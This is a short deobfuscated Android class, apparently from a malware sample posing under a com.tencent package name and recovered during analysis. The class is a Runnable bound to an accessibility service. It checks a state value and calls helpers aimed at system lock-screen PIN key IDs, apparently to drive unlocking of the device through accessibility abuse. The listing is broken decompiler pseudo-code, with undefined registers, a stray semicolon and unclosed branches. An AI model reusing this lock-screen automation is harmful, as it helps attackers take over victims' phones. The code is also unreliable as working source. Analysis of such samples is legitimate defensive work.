package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: ScreenLockMonitor_2
 * Original: Lcom/tencent/Loc_tunesxconcerningn10_k$2;
 */
class ScreenLockMonitor_2 implements Runnable; {

    // === FIELDS ===
    final AccessibilityServiceCore val$classGen12;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0) {
        v0.val$classGen12 = v1;
        // new Object()
        return;
    }

    public void run() {
        v0 = v2.val$classGen12;
        ScreenLockMonitor.access$000(v0);
        v0 = v2.val$classGen12;
        v1 = ScreenLockMonitor.access$100(v0);
        v1 = 1;
        if (v0 != 1) { // goto +10
        v0 = v2.val$classGen12;
        ScreenLockMonitor.access$200(v0, "com.android.systemui:id/key");
        // goto (branch)
        v1 = 2;
        if (v0 != 2) { // goto +8
        v0 = v2.val$classGen12;
        ScreenLockMonitor.access$300(v0);
        // goto (branch)
        v1 = 3;
        if (v0 != 3) { // goto +9
        v0 = v2.val$classGen12;
        ScreenLockMonitor.access$200(v0, "com.android.systemui:id/VivoPinkey");
        return;
    }
}
